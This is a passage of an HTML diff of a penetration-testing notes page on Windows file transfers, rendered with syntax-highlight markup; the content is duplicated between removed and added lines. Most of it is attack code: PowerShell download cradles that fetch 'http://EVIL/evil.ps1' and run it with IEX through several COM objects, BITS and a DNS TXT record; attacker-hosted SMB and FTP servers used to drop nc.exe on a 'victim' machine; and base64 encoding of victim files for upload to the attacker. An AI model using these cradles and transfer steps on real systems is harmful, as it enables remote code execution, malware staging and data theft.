class="nv">$ie</span><span class="p">.</span><span class="n">quit</span><span class="p">();</span><span class="nb">IEX </span><span class="nv">$r</span>
-</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>
-</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a><span class="c"># Msxml2.XMLHTTP COM object</span>
-</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a><span class="nv">$h</span><span class="p">=</span><span class="nb">New-Object</span> <span class="n">-ComObject</span> <span class="n">Msxml2</span><span class="p">.</span><span class="n">XMLHTTP</span><span class="p">;</span> <span class="nv">$h</span><span class="p">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span><span class="s1">&#39;http://EVIL/evil.ps1&#39;</span><span class="p">,</span><span class="nv">$false</span><span class="p">);</span> <span class="nv">$h</span><span class="p">.</span><span class="n">send</span><span class="p">();</span> <span class="nb">iex </span><span class="nv">$h</span><span class="p">.</span><span class="n">responseText</span>
-</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a>
-</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a><span class="c"># WinHttp COM object (not proxy aware!)</span>
-</span><span id="__span-8-14"><a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a><span class="nv">$h</span><span class="p">=</span><span class="nb">new-object</span> <span class="n">-com</span> <span class="n">WinHttp</span><span class="p">.</span><span class="n">WinHttpRequest</span><span class="p">.</span><span class="n">5</span><span class="p">.</span><span class="n">1</span><span class="p">;</span> <span class="nv">$h</span><span class="p">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span><span class="s1">&#39;http://EVIL/evil.ps1&#39;</span><span class="p">,</span><span class="nv">$false</span><span class="p">);</span> <span class="nv">$h</span><span class="p">.</span><span class="n">send</span><span class="p">();</span><span class="nb">iex </span><span class="nv">$h</span><span class="p">.</span><span class="n">responseText</span>
-</span><span id="__span-8-15"><a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a>
-</span><span id="__span-8-16"><a id="__codelineno-8-16" name="__codelineno-8-16" href="#__codelineno-8-16"></a><span class="c"># using bitstransfer- touches disk!</span>
-</span><span id="__span-8-17"><a id="__codelineno-8-17" name="__codelineno-8-17" href="#__codelineno-8-17"></a><span class="nb">Import-Module</span> <span class="n">bitstransfer</span><span class="p">;</span><span class="nb">Start-BitsTransfer</span> <span class="s1">&#39;http://EVIL/evil.ps1&#39;</span> <span class="nv">$env:temp</span><span class="p">\</span><span class="n">t</span><span class="p">;</span> <span class="nv">$r</span><span class="p">=</span><span class="nb">gc </span><span class="nv">$env:temp</span><span class="p">\</span><span class="n">t</span><span class="p">;</span> <span class="nb">rm </span><span class="nv">$env:temp</span><span class="p">\</span><span class="n">t</span><span class="p">;</span> <span class="nb">iex </span><span class="nv">$r</span>
-</span><span id="__span-8-18"><a id="__codelineno-8-18" name="__codelineno-8-18" href="#__codelineno-8-18"></a>
-</span><span id="__span-8-19"><a id="__codelineno-8-19" name="__codelineno-8-19" href="#__codelineno-8-19"></a><span class="c"># DNS TXT approach from PowerBreach (https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerBreach/PowerBreach.ps1)</span>
-</span><span id="__span-8-20"><a id="__codelineno-8-20" name="__codelineno-8-20" href="#__codelineno-8-20"></a><span class="c">#   code to execute needs to be a base64 encoded string stored in a TXT record</span>
-</span><span id="__span-8-21"><a id="__codelineno-8-21" name="__codelineno-8-21" href="#__codelineno-8-21"></a><span class="nb">IEX </span><span class="p">(</span><span class="no">[System.Text.Encoding]</span><span class="p">::</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="no">[System.Convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">(((</span><span class="n">nslookup</span> <span class="n">-querytype</span><span class="p">=</span><span class="n">txt</span> <span class="s2">&quot;SERVER&quot;</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">-Pattern</span> <span class="s1">&#39;&quot;*&quot;&#39;</span><span class="p">)</span> <span class="n">-split</span> <span class="s1">&#39;&quot;&#39;</span><span class="p">[</span><span class="n">0</span><span class="p">]))))</span>
-</span><span id="__span-8-22"><a id="__codelineno-8-22" name="__codelineno-8-22" href="#__codelineno-8-22"></a>
-</span><span id="__span-8-23"><a id="__codelineno-8-23" name="__codelineno-8-23" href="#__codelineno-8-23"></a><span class="c"># from @subtee - https://gist.github.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d</span>
-</span><span id="__span-8-24"><a id="__codelineno-8-24" name="__codelineno-8-24" href="#__codelineno-8-24"></a><span class="cm">&lt;#</span>
-</span><span id="__span-8-25"><a id="__codelineno-8-25" name="__codelineno-8-25" href="#__codelineno-8-25"></a><span class="cm">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
-</span><span id="__span-8-26"><a id="__codelineno-8-26" name="__codelineno-8-26" href="#__codelineno-8-26"></a><span class="cm">&lt;command&gt;</span>
-</span><span id="__span-8-27"><a id="__codelineno-8-27" name="__codelineno-8-27" href="#__codelineno-8-27"></a><span class="cm">   &lt;a&gt;</span>
-</span><span id="__span-8-28"><a id="__codelineno-8-28" name="__codelineno-8-28" href="#__codelineno-8-28"></a><span class="cm">      &lt;execute&gt;Get-Process&lt;/execute&gt;</span>
-</span><span id="__span-8-29"><a id="__codelineno-8-29" name="__codelineno-8-29" href="#__codelineno-8-29"></a><span class="cm">   &lt;/a&gt;</span>
-</span><span id="__span-8-30"><a id="__codelineno-8-30" name="__codelineno-8-30" href="#__codelineno-8-30"></a><span class="cm">  &lt;/command&gt;</span>
-</span><span id="__span-8-31"><a id="__codelineno-8-31" name="__codelineno-8-31" href="#__codelineno-8-31"></a><span class="cm">#&gt;</span>
-</span><span id="__span-8-32"><a id="__codelineno-8-32" name="__codelineno-8-32" href="#__codelineno-8-32"></a><span class="nv">$a</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Xml</span><span class="p">.</span><span class="n">XmlDocument</span>
-</span><span id="__span-8-33"><a id="__codelineno-8-33" name="__codelineno-8-33" href="#__codelineno-8-33"></a><span class="nv">$a</span><span class="p">.</span><span class="n">Load</span><span class="p">(</span><span class="s2">&quot;https://gist.githubusercontent.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d/raw/1ffde429dc4a05f7bc7ffff32017a3133634bc36/gistfile1.txt&quot;</span><span class="p">)</span>
-</span><span id="__span-8-34"><a id="__codelineno-8-34" name="__codelineno-8-34" href="#__codelineno-8-34"></a><span class="nv">$a</span><span class="p">.</span><span class="n">command</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="n">execute</span> <span class="p">|</span> <span class="nb">iex</span>
-</span></code></pre></div>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-8-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-8-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-8-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-8-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-8-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-8-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-8-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-8-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-8-10">10</a></span>
+<span class="normal"><a href="#__codelineno-8-11">11</a></span>
+<span class="normal"><a href="#__codelineno-8-12">12</a></span>
+<span class="normal"><a href="#__codelineno-8-13">13</a></span>
+<span class="normal"><a href="#__codelineno-8-14">14</a></span>
+<span class="normal"><a href="#__codelineno-8-15">15</a></span>
+<span class="normal"><a href="#__codelineno-8-16">16</a></span>
+<span class="normal"><a href="#__codelineno-8-17">17</a></span>
+<span class="normal"><a href="#__codelineno-8-18">18</a></span>
+<span class="normal"><a href="#__codelineno-8-19">19</a></span>
+<span class="normal"><a href="#__codelineno-8-20">20</a></span>
+<span class="normal"><a href="#__codelineno-8-21">21</a></span>
+<span class="normal"><a href="#__codelineno-8-22">22</a></span>
+<span class="normal"><a href="#__codelineno-8-23">23</a></span>
+<span class="normal"><a href="#__codelineno-8-24">24</a></span>
+<span class="normal"><a href="#__codelineno-8-25">25</a></span>
+<span class="normal"><a href="#__codelineno-8-26">26</a></span>
+<span class="normal"><a href="#__codelineno-8-27">27</a></span>
+<span class="normal"><a href="#__codelineno-8-28">28</a></span>
+<span class="normal"><a href="#__codelineno-8-29">29</a></span>
+<span class="normal"><a href="#__codelineno-8-30">30</a></span>
+<span class="normal"><a href="#__codelineno-8-31">31</a></span>
+<span class="normal"><a href="#__codelineno-8-32">32</a></span>
+<span class="normal"><a href="#__codelineno-8-33">33</a></span>
+<span class="normal"><a href="#__codelineno-8-34">34</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a><span class="c"># normal download cradle</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2"></a><span class="nb">IEX </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">Webclient</span><span class="p">).</span><span class="n">downloadstring</span><span class="p">(</span><span class="s2">&quot;http://EVIL/evil.ps1&quot;</span><span class="p">)</span>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3"></a>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4"></a><span class="c"># PowerShell 3.0+</span>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5"></a><span class="nb">IEX </span><span class="p">(</span><span class="nb">iwr </span><span class="s1">&#39;http://EVIL/evil.ps1&#39;</span><span class="p">)</span>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6"></a>
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7"></a><span class="c"># hidden IE com object</span>
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8"></a><span class="nv">$ie</span><span class="p">=</span><span class="nb">New-Object</span> <span class="n">-comobject</span> <span class="n">InternetExplorer</span><span class="p">.</span><span class="n">Application</span><span class="p">;</span> <span class="nv">$ie</span><span class="p">.</span><span class="n">visible</span><span class="p">=</span><span class="nv">$False</span><span class="p">;</span> <span class="nv">$ie</span><span class="p">.</span><span class="n">navigate</span><span class="p">(</span><span class="s1">&#39;http://EVIL/evil.ps1&#39;</span><span class="p">);</span> <span class="nb">start-sleep</span> <span class="n">-s</span> <span class="n">5</span><span class="p">;</span> <span class="nv">$r</span><span class="p">=</span><span class="nv">$ie</span><span class="p">.</span><span class="n">Document</span><span class="p">.</span><span class="n">body</span><span class="p">.</span><span class="n">innerHTML</span><span class="p">;</span> <span class="nv">$ie</span><span class="p">.</span><span class="n">quit</span><span class="p">();</span><span class="nb">IEX </span><span class="nv">$r</span>
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9"></a>
+</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10"></a><span class="c"># Msxml2.XMLHTTP COM object</span>
+</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11"></a><span class="nv">$h</span><span class="p">=</span><span class="nb">New-Object</span> <span class="n">-ComObject</span> <span class="n">Msxml2</span><span class="p">.</span><span class="n">XMLHTTP</span><span class="p">;</span> <span class="nv">$h</span><span class="p">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span><span class="s1">&#39;http://EVIL/evil.ps1&#39;</span><span class="p">,</span><span class="nv">$false</span><span class="p">);</span> <span class="nv">$h</span><span class="p">.</span><span class="n">send</span><span class="p">();</span> <span class="nb">iex </span><span class="nv">$h</span><span class="p">.</span><span class="n">responseText</span>
+</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12"></a>
+</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13"></a><span class="c"># WinHttp COM object (not proxy aware!)</span>
+</span><span id="__span-8-14"><a id="__codelineno-8-14" name="__codelineno-8-14"></a><span class="nv">$h</span><span class="p">=</span><span class="nb">new-object</span> <span class="n">-com</span> <span class="n">WinHttp</span><span class="p">.</span><span class="n">WinHttpRequest</span><span class="p">.</span><span class="n">5</span><span class="p">.</span><span class="n">1</span><span class="p">;</span> <span class="nv">$h</span><span class="p">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span><span class="s1">&#39;http://EVIL/evil.ps1&#39;</span><span class="p">,</span><span class="nv">$false</span><span class="p">);</span> <span class="nv">$h</span><span class="p">.</span><span class="n">send</span><span class="p">();</span><span class="nb">iex </span><span class="nv">$h</span><span class="p">.</span><span class="n">responseText</span>
+</span><span id="__span-8-15"><a id="__codelineno-8-15" name="__codelineno-8-15"></a>
+</span><span id="__span-8-16"><a id="__codelineno-8-16" name="__codelineno-8-16"></a><span class="c"># using bitstransfer- touches disk!</span>
+</span><span id="__span-8-17"><a id="__codelineno-8-17" name="__codelineno-8-17"></a><span class="nb">Import-Module</span> <span class="n">bitstransfer</span><span class="p">;</span><span class="nb">Start-BitsTransfer</span> <span class="s1">&#39;http://EVIL/evil.ps1&#39;</span> <span class="nv">$env:temp</span><span class="p">\</span><span class="n">t</span><span class="p">;</span> <span class="nv">$r</span><span class="p">=</span><span class="nb">gc </span><span class="nv">$env:temp</span><span class="p">\</span><span class="n">t</span><span class="p">;</span> <span class="nb">rm </span><span class="nv">$env:temp</span><span class="p">\</span><span class="n">t</span><span class="p">;</span> <span class="nb">iex </span><span class="nv">$r</span>
+</span><span id="__span-8-18"><a id="__codelineno-8-18" name="__codelineno-8-18"></a>
+</span><span id="__span-8-19"><a id="__codelineno-8-19" name="__codelineno-8-19"></a><span class="c"># DNS TXT approach from PowerBreach (https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerBreach/PowerBreach.ps1)</span>
+</span><span id="__span-8-20"><a id="__codelineno-8-20" name="__codelineno-8-20"></a><span class="c">#   code to execute needs to be a base64 encoded string stored in a TXT record</span>
+</span><span id="__span-8-21"><a id="__codelineno-8-21" name="__codelineno-8-21"></a><span class="nb">IEX </span><span class="p">(</span><span class="no">[System.Text.Encoding]</span><span class="p">::</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="no">[System.Convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">(((</span><span class="n">nslookup</span> <span class="n">-querytype</span><span class="p">=</span><span class="n">txt</span> <span class="s2">&quot;SERVER&quot;</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">-Pattern</span> <span class="s1">&#39;&quot;*&quot;&#39;</span><span class="p">)</span> <span class="n">-split</span> <span class="s1">&#39;&quot;&#39;</span><span class="p">[</span><span class="n">0</span><span class="p">]))))</span>
+</span><span id="__span-8-22"><a id="__codelineno-8-22" name="__codelineno-8-22"></a>
+</span><span id="__span-8-23"><a id="__codelineno-8-23" name="__codelineno-8-23"></a><span class="c"># from @subtee - https://gist.github.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d</span>
+</span><span id="__span-8-24"><a id="__codelineno-8-24" name="__codelineno-8-24"></a><span class="cm">&lt;#</span>
+</span><span id="__span-8-25"><a id="__codelineno-8-25" name="__codelineno-8-25"></a><span class="cm">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+</span><span id="__span-8-26"><a id="__codelineno-8-26" name="__codelineno-8-26"></a><span class="cm">&lt;command&gt;</span>
+</span><span id="__span-8-27"><a id="__codelineno-8-27" name="__codelineno-8-27"></a><span class="cm">   &lt;a&gt;</span>
+</span><span id="__span-8-28"><a id="__codelineno-8-28" name="__codelineno-8-28"></a><span class="cm">      &lt;execute&gt;Get-Process&lt;/execute&gt;</span>
+</span><span id="__span-8-29"><a id="__codelineno-8-29" name="__codelineno-8-29"></a><span class="cm">   &lt;/a&gt;</span>
+</span><span id="__span-8-30"><a id="__codelineno-8-30" name="__codelineno-8-30"></a><span class="cm">  &lt;/command&gt;</span>
+</span><span id="__span-8-31"><a id="__codelineno-8-31" name="__codelineno-8-31"></a><span class="cm">#&gt;</span>
+</span><span id="__span-8-32"><a id="__codelineno-8-32" name="__codelineno-8-32"></a><span class="nv">$a</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Xml</span><span class="p">.</span><span class="n">XmlDocument</span>
+</span><span id="__span-8-33"><a id="__codelineno-8-33" name="__codelineno-8-33"></a><span class="nv">$a</span><span class="p">.</span><span class="n">Load</span><span class="p">(</span><span class="s2">&quot;https://gist.githubusercontent.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d/raw/1ffde429dc4a05f7bc7ffff32017a3133634bc36/gistfile1.txt&quot;</span><span class="p">)</span>
+</span><span id="__span-8-34"><a id="__codelineno-8-34" name="__codelineno-8-34"></a><span class="nv">$a</span><span class="p">.</span><span class="n">command</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="n">execute</span> <span class="p">|</span> <span class="nb">iex</span>
+</span></code></pre></div></td></tr></table></div>
 <h3 id="smb">SMB</h3>
 <p>The Server Message Block protocol (SMB protocol) that runs on port TCP/445 is common in enterprise networks where Windows services are running. It enables applications and users to transfer files to and from remote servers.</p>
 <h4 id="simple-smbserver">Simple SMBserver</h4>
 <p>From attacker machine, we can use <a href="../smbserver/">smbserver.py</a>:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="c1"># First, we create an SMB server in our attacker machine (linux) with smbserver from Impacket </span>
-</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>
-</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>sudo<span class="w"> </span>impacket-smbserver<span class="w"> </span>share<span class="w"> </span>-smb2support<span class="w"> </span>/tmp/smbshare
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1">1</a></span>
+<span class="normal"><a href="#__codelineno-9-2">2</a></span>
+<span class="normal"><a href="#__codelineno-9-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a><span class="c1"># First, we create an SMB server in our attacker machine (linux) with smbserver from Impacket </span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2"></a>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3"></a>sudo<span class="w"> </span>impacket-smbserver<span class="w"> </span>share<span class="w"> </span>-smb2support<span class="w"> </span>/tmp/smbshare
+</span></code></pre></div></td></tr></table></div>
 <p>From the windows machine, the victim's, copy the File from the SMB Server</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>copy \\$ipServer\share\nc.exe
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1"></a>copy \\$ipServer\share\nc.exe
+</span></code></pre></div></td></tr></table></div>
 <p>If blocked because of organization's security policies blocking unauthenticated guest access, create the SMBserver with username and password.</p>
 <h4 id="simple-smbserver-with-authentication">Simple SMBServer with authentication</h4>
 <p>From attacker machine, we can use <a href="../smbserver/">smbserver.py</a>:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>sudo<span class="w"> </span>impacket-smbserver<span class="w"> </span>share<span class="w"> </span>-smb2support<span class="w"> </span>/tmp/smbshare<span class="w"> </span>-user<span class="w"> </span><span class="nb">test</span><span class="w"> </span>-password<span class="w"> </span><span class="nb">test</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1"></a>sudo<span class="w"> </span>impacket-smbserver<span class="w"> </span>share<span class="w"> </span>-smb2support<span class="w"> </span>/tmp/smbshare<span class="w"> </span>-user<span class="w"> </span><span class="nb">test</span><span class="w"> </span>-password<span class="w"> </span><span class="nb">test</span>
+</span></code></pre></div></td></tr></table></div>
 <p>From victim's machine, the windows one:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a># mount the SMB Server with Username and Password
-</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>net use n: \\$ipServer\share /user:test test
-</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>
-</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a># Copy the file
-</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>copy n:\nc.exe
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1">1</a></span>
+<span class="normal"><a href="#__codelineno-12-2">2</a></span>
+<span class="normal"><a href="#__codelineno-12-3">3</a></span>
+<span class="normal"><a href="#__codelineno-12-4">4</a></span>
+<span class="normal"><a href="#__codelineno-12-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1"></a># mount the SMB Server with Username and Password
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2"></a>net use n: \\$ipServer\share /user:test test
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3"></a>
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4"></a># Copy the file
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5"></a>copy n:\nc.exe
+</span></code></pre></div></td></tr></table></div>
 <h3 id="ftp-downloads">FTP Downloads</h3>
 <p>Another way to transfer files is using FTP (File Transfer Protocol), which use port TCP/21 and TCP/20. We can use the FTP client or PowerShell Net.WebClient to download files from an FTP server.</p>
 <p>We can configure an FTP Server in our attack host using Python3 pyftpdlib module. It can be installed with the following command:</p>
 <h4 id="pyftpdlib-module">pyftpdlib module</h4>
 <p>Configure an <strong>FTP Server</strong> in our attack host using Python3 <a href="../pyftpdlib/">pyftpdlib</a> module:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>sudo<span class="w"> </span>pip3<span class="w"> </span>install<span class="w"> </span>pyftpdlib
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-13-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1"></a>sudo<span class="w"> </span>pip3<span class="w"> </span>install<span class="w"> </span>pyftpdlib
+</span></code></pre></div></td></tr></table></div>
 <p>Then we can specify port number 21 because, by default, pyftpdlib uses port 2121. Anonymous authentication is enabled by default if we don't set a user and password.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>sudo<span class="w"> </span>python3<span class="w"> </span>-m<span class="w"> </span>pyftpdlib<span class="w"> </span>--port<span class="w"> </span><span class="m">21</span><span class="w"> </span>--write
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-14-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1"></a>sudo<span class="w"> </span>python3<span class="w"> </span>-m<span class="w"> </span>pyftpdlib<span class="w"> </span>--port<span class="w"> </span><span class="m">21</span><span class="w"> </span>--write
+</span></code></pre></div></td></tr></table></div>
 <p>We can use the FTP client or <strong>PowerShell Net.WebClient</strong> to download files from an FTP server. </p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadFile</span><span class="p">(</span><span class="s1">&#39;ftp://$ipServer/file.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;ftp-file.txt&#39;</span><span class="p">)</span>
-</span></code></pre></div>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-15-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1"></a><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadFile</span><span class="p">(</span><span class="s1">&#39;ftp://$ipServer/file.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;ftp-file.txt&#39;</span><span class="p">)</span>
+</span></code></pre></div></td></tr></table></div>
 <h2 id="upload-from-windows">Upload from Windows</h2>
 <h3 id="powershell-base64-encode-decode_1">PowerShell Base64 Encode &amp; Decode</h3>
 <p><strong>Upload  from Windows (victim) to  linux (attacker)</strong> </p>
 <p>In the victim's machine (windows):</p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="c"># Encode File Using PowerShell</span>
-</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="no">[Convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">((</span><span class="nb">Get-Content</span> <span class="n">-path</span> <span class="s2">&quot;C:\Windows\system32\drivers\etc\hosts&quot;</span> <span class="n">-Encoding</span> <span class="n">byte</span><span class="p">))</span>
-</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>
-</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>
-</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="nb">Get-FileHash</span> <span class="s2">&quot;C:\Windows\system32\drivers\etc\hosts&quot;</span> <span class="n">-Algorithm</span> <span class="n">MD5</span> <span class="p">|</span> <span class="nb">select </span><span class="n">Hash</span>
-</span></code></pre></div>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-16-1">1</a></span>
+<span class="normal"><a href="#__codelineno-16-2">2</a></span>
+<span class="normal"><a href="#__codelineno-16-3">3</a></span>
+<span class="normal"><a href="#__codelineno-16-4">4</a></span>
+<span class="normal"><a href="#__codelineno-16-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1"></a><span class="c"># Encode File Using PowerShell</span>
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2"></a><span class="no">[Convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">((</span><span class="nb">Get-Content</span> <span class="n">-path</span> <span class="s2">&quot;C:\Windows\system32\drivers\etc\hosts&quot;</span> <span class="n">-Encoding</span> <span class="n">byte</span><span class="p">))</span>
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3"></a>
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4"></a>
+</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5"></a><span class="nb">Get-FileHash</span> <span class="s2">&quot;C:\Windows\system32\drivers\etc\hosts&quot;</span> <span class="n">-Algorithm</span> <span class="n">MD5</span> <span class="p">|</span> <span class="nb">select </span><span class="n">Hash</span>
+</span></code></pre></div></td></tr></table></div>
 <p>In the attacker's machine (Linux): We copy this content and paste it into our attack host, use the base64 command to decode it, and use the md5sum application to confirm the transfer happened correctly.</p>
